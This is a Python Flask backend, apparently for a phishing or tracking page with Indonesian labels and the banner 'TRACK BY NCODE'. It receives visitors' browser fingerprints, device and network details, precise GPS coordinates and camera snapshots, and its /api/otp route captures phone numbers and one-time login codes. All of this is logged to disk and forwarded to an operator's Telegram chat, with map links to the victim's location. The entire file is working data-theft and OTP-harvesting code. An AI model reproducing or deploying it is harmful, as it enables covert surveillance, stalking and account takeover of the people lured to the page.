import os
import json
import base64
import time
import socket
import requests
from flask import Flask, request, jsonify, render_template
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
IPAPI = "http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query"

app = Flask(__name__)

LOG_DIR = os.path.join(os.path.dirname(__file__), "logs")
os.makedirs(LOG_DIR, exist_ok=True)

_ip_cache = {}


def client_ip():
    for h in ("CF-Connecting-IP", "True-Client-IP", "X-Real-IP"):
        v = request.headers.get(h)
        if v:
            return v.strip()
    fwd = request.headers.get("X-Forwarded-For")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.remote_addr or "unknown"


def ip_info(ip):
    if ip in _ip_cache:
        return _ip_cache[ip]
    info = {"ip": ip}
    try:
        r = requests.get(
            IPAPI.format(ip=ip),
            timeout=6,
            headers={"User-Agent": "Mozilla/5.0"},
        )
        if r.status_code == 200:
            j = r.json()
            if j.get("status") == "success":
                info.update(
                    {
                        "ipv4_or_v6": "IPv6" if ":" in ip else "IPv4",
                        "country": j.get("country"),
                        "country_code": j.get("countryCode"),
                        "region": j.get("regionName"),
                        "city": j.get("city"),
                        "zip": j.get("zip"),
                        "lat": j.get("lat"),
                        "lng": j.get("lon"),
                        "timezone": j.get("timezone"),
                        "isp": j.get("isp"),
                        "org": j.get("org"),
                        "asn": j.get("as"),
                        "asname": j.get("asname"),
                        "reverse_dns": j.get("reverse"),
                        "mobile": j.get("mobile"),
                        "proxy": j.get("proxy"),
                        "hosting": j.get("hosting"),
                    }
                )
    except Exception as e:
        info["error"] = str(e)

    # reverse dns fallback
    if not info.get("reverse_dns"):
        try:
            info["reverse_dns"] = socket.gethostbyaddr(ip)[0]
        except Exception:
            info["reverse_dns"] = "n/a"

    _ip_cache[ip] = info
    return info


def tg_send(text, disable_preview=False):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        requests.post(
            f"{TG_API}/sendMessage",
            data={
                "chat_id": CHAT_ID,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": "true" if disable_preview else "false",
            },
            timeout=10,
        )
    except Exception as e:
        print("TG sendMessage error:", e)


def tg_send_photo(path, caption=""):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        with open(path, "rb") as f:
            requests.post(
                f"{TG_API}/sendPhoto",
                data={
                    "chat_id": CHAT_ID,
                    "caption": caption[:1000],
                    "parse_mode": "HTML",
                },
                files={"photo": f},
                timeout=30,
            )
    except Exception as e:
        print("TG sendPhoto error:", e)


def build_telegram_message(data):
    srv = data.get("_server", {})
    net = data.get("network", {})
    osd = data.get("os", {})
    dev = data.get("device", {})
    fpr = data.get("fingerprint", {})
    sens = data.get("sensors", {})
    geo = data.get("geo") or {}
    ch = srv.get("client_hints") or {}

    ip = srv.get("ip", "-")
    ipaddr = net.get("ip_info", {}) or {}
    ipv = ipaddr.get("ipv4_or_v6", "IPv6" if ":" in ip else "IPv4")

    lat = geo.get("lat") or ipaddr.get("lat")
    lng = geo.get("lng") or ipaddr.get("lng")
    acc = geo.get("accuracy")
    gps_src = "GPS (device)" if geo.get("lat") else "IP-based (approx)"

    gmaps = ""
    if lat and lng:
        gmaps = (
            f"https://www.google.com/maps?q={lat},{lng}\n"
            f"https://maps.google.com/?q={lat},{lng}&z=18\n"
            f"https://yandex.com/maps/?ll={lng}%2C{lat}&z=17"
        )

    def esc(v):
        return str(v) if v is not None else "-"

    parts = []
    parts.append("🎯 <b>TRACK BY NCODE</b>")
    parts.append(f"<b>Waktu</b>: {srv.get('ts','-')}")

    # ---- NETWORK / IP ----
    parts.append("\n<b>═══ 🌐 NETWORK ═══</b>")
    parts.append(f"<b>IP</b> <code>{ip}</code> ({ipv})")
    parts.append(f"<b>Reverse DNS</b>: <code>{esc(ipaddr.get('reverse_dns'))}</code>")
    parts.append(f"<b>ISP</b>: {esc(ipaddr.get('isp'))}")
    parts.append(f"<b>Org</b>: {esc(ipaddr.get('org'))}")
    parts.append(f"<b>ASN</b>: {esc(ipaddr.get('asn'))} ({esc(ipaddr.get('asname'))})")
    parts.append(f"<b>Negara</b>: {esc(ipaddr.get('country'))} [{esc(ipaddr.get('country_code'))}]")
    parts.append(f"<b>Region</b>: {esc(ipaddr.get('region'))}")
    parts.append(f"<b>Kota</b>: {esc(ipaddr.get('city'))} — {esc(ipaddr.get('zip'))}")
    parts.append(f"<b>Timezone</b>: {esc(ipaddr.get('timezone'))}")
    parts.append(f"<b>Mobile/Proxy/Hosting</b>: {esc(ipaddr.get('mobile'))}/{esc(ipaddr.get('proxy'))}/{esc(ipaddr.get('hosting'))}")
    parts.append(f"<b>Local IP (WebRTC)</b>: <code>{esc(net.get('webrtc_local'))}</code>")
    parts.append(f"<b>Conn API</b>: {esc(net.get('conn'))}")
    parts.append(f"<b>Downlink/RTT</b>: {esc(net.get('downlink'))}Mbps / {esc(net.get('rtt'))}ms")
    parts.append(f"<b>Save-data</b>: {esc(net.get('save_data'))}")
    parts.append(f"<b>Accept-Lang</b>: {esc(srv.get('accept_lang'))}")
    parts.append(f"<b>Referer</b>: {esc(srv.get('referer'))}")

    # ---- OS ----
    parts.append("\n<b>═══ 💻 OS / SYSTEM ═══</b>")
    parts.append(f"<b>OS</b>: {esc(osd.get('name'))}")
    parts.append(f"<b>Version</b>: {esc(osd.get('version'))}")
    parts.append(f"<b>Arch</b>: {esc(osd.get('arch'))}")
    if ch:
        parts.append(f"<b>CH Platform</b>: {esc(ch.get('platform'))} {esc(ch.get('platformVersion'))}")
        parts.append(f"<b>CH Model</b>: {esc(ch.get('model'))}")
        parts.append(f"<b>CH Arch</b>: {esc(ch.get('architecture'))} / {esc(ch.get('bitness'))}bit")
        parts.append(f"<b>CH Brand</b>: {esc(ch.get('brand'))} / {esc(ch.get('mobile'))}")
    parts.append(f"<b>UA</b>: <code>{(srv.get('ua_header') or '-')[:280]}</code>")

    # ---- DEVICE ----
    parts.append("\n<b>═══ 📱 DEVICE / HARDWARE ═══</b>")
    parts.append(f"<b>Platform</b>: {esc(dev.get('platform'))}")
    parts.append(f"<b>Screen</b>: {esc(dev.get('screen'))}")
    parts.append(f"<b>Viewport</b>: {esc(dev.get('viewport'))}")
    parts.append(f"<b>DPR / Color</b>: {esc(dev.get('dpr'))} / {esc(dev.get('color_depth'))}bit")
    parts.append(f"<b>CPU</b>: {esc(dev.get('cores'))} core")
    parts.append(f"<b>RAM</b>: {esc(dev.get('ram'))} GB")
    parts.append(f"<b>GPU</b>: {esc(dev.get('gpu'))}")
    parts.append(f"<b>Battery</b>: {esc(dev.get('battery'))}")
    parts.append(f"<b>Touch</b>: {esc(dev.get('touch'))} | <b>Hover</b>: {esc(dev.get('hover'))}")
    parts.append(f"<b>Lang</b>: {esc(dev.get('lang'))} ({esc(dev.get('langs'))})")
    parts.append(f"<b>TZ</b>: {esc(dev.get('tz'))}")
    parts.append(f"<b>Storage</b>: used {esc((sens.get('storage') or {}).get('usage'))} / quota {esc((sens.get('storage') or {}).get('quota'))}")

    # ---- FINGERPRINT ----
    parts.append("\n<b>═══ 🧬 FINGERPRINT ═══</b>")
    parts.append(f"<b>Canvas</b>: <code>{esc(fpr.get('canvas'))}</code>")
    parts.append(f"<b>Audio</b>: <code>{esc(fpr.get('audio'))}</code>")
    parts.append(f"<b>WebGL Vendor</b>: {esc(fpr.get('webgl_vendor'))}")
    parts.append(f"<b>Fonts</b>: {esc(fpr.get('fonts'))}")
    parts.append(f"<b>Voices</b>: {esc(fpr.get('voice_count'))} — {esc(fpr.get('voice_sample'))}")
    parts.append(f"<b>Plugins</b>: {esc(fpr.get('plugins'))}")
    parts.append(f"<b>DoNotTrack</b>: {esc(fpr.get('dnt'))} | <b>Cookies</b>: {esc(fpr.get('cookies'))}")
    parts.append(f"<b>Adblock hint</b>: {esc(fpr.get('adblock'))}")

    # ---- SENSORS ----
    parts.append("\n<b>═══ 📡 SENSOR / PERMISSION ═══</b>")
    perm = sens.get("permissions") or {}
    for k, v in perm.items():
        parts.append(f"<b>{k}</b>: {esc(v)}")
    parts.append(f"<b>MediaDevices</b>: {esc(sens.get('media_devices'))}")

    # ---- GEO ----
    parts.append("\n<b>═══ 📍 GEOLOKASI ═══</b>")
    parts.append(f"<b>Sumber</b>: {gps_src}")
    parts.append(f"<b>Lat, Lng</b>: <code>{esc(lat)}, {esc(lng)}</code>")
    parts.append(f"<b>Akurasi</b>: {esc(acc)} m")
    if geo:
        parts.append(f"<b>Altitude</b>: {esc(geo.get('altitude'))} | <b>Heading</b>: {esc(geo.get('heading'))} | <b>Speed</b>: {esc(geo.get('speed'))}")
    if gmaps:
        parts.append("<b>🗺 Buka Peta:</b>")
        parts.append(gmaps)

    # ---- OTP ----
    phone = data.get("phone", "-")
    parts.append("\n<b>═══ 📞 KONTAK ═══</b>")
    parts.append(f"<b>Phone</b>: <code>{phone}</code>")

    return "\n".join(parts)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/collect", methods=["POST"])
def collect():
    data = request.get_json(silent=True) or {}
    ip = client_ip()
    ts = time.strftime("%Y%m%d-%H%M%S")
    ipaddr = ip_info(ip)

    ch = {}
    for h in (
        "Sec-CH-UA-Platform",
        "Sec-CH-UA-Platform-Version",
        "Sec-CH-UA-Model",
        "Sec-CH-UA-Arch",
        "Sec-CH-UA-Bitness",
        "Sec-CH-UA-Full-Version-List",
        "Sec-CH-UA-Brand",
        "Sec-CH-UA-Mobile",
    ):
        v = request.headers.get(h)
        if v:
            ch[h.replace("Sec-CH-UA-", "").lower().replace("-", "_")] = v.strip('"')

    data["_server"] = {
        "ip": ip,
        "ip_info": ipaddr,
        "ua_header": request.headers.get("User-Agent"),
        "accept_lang": request.headers.get("Accept-Language"),
        "referer": request.headers.get("Referer"),
        "forwarded": request.headers.get("X-Forwarded-For"),
        "cf_ip": request.headers.get("CF-Connecting-IP"),
        "client_hints": ch,
        "ts": ts,
    }

    fp = os.path.join(LOG_DIR, f"{ip}_{ts}.json")
    with open(fp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

    msg = build_telegram_message(data)
    tg_send(msg)

    cam = data.get("camera")
    if cam and isinstance(cam, str) and cam.startswith("data:image"):
        try:
            _, b64 = cam.split(",", 1)
            img = base64.b64decode(b64)
            cp = os.path.join(LOG_DIR, f"{ip}_{ts}_cam.jpg")
            with open(cp, "wb") as f:
                f.write(img)
            geo = data.get("geo") or {}
            cap = f"📸 <b>Kamera</b> {data.get('phone','-')} — {ip}"
            if geo.get("lat"):
                cap += f"\n📍 https://maps.google.com/?q={geo['lat']},{geo['lng']}"
            tg_send_photo(cp, cap)
        except Exception as e:
            print("camera save error:", e)

    return jsonify({"ok": True})


@app.route("/api/otp", methods=["POST"])
def otp():
    data = request.get_json(silent=True) or {}
    ip = client_ip()
    ts = time.strftime("%Y%m%d-%H%M%S")
    code = data.get("code", "-")
    phone = data.get("phone", "-")

    fp = os.path.join(LOG_DIR, f"{ip}_{ts}_otp.json")
    with open(fp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

    ipaddr = ip_info(ip)
    tg_send(
        f"<b>🔑 OTP MASUK</b>\n"
        f"<b>Phone</b>: <code>{phone}</code>\n"
        f"<b>Kode</b>: <code>{code}</code>\n"
        f"<b>IP</b>: <code>{ip}</code> ({ipaddr.get('ipv4_or_v6','-')})\n"
        f"<b>ISP</b>: {ipaddr.get('isp','-')} / {ipaddr.get('asn','-')}\n"
        f"<b>Lokasi IP</b>: {ipaddr.get('city','-')}, {ipaddr.get('region','-')}, {ipaddr.get('country','-')}\n"
        f"<b>Peta IP</b>: https://www.google.com/maps?q={ipaddr.get('lat','')},{ipaddr.get('lng','')}"
    )
    return jsonify({"ok": True})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)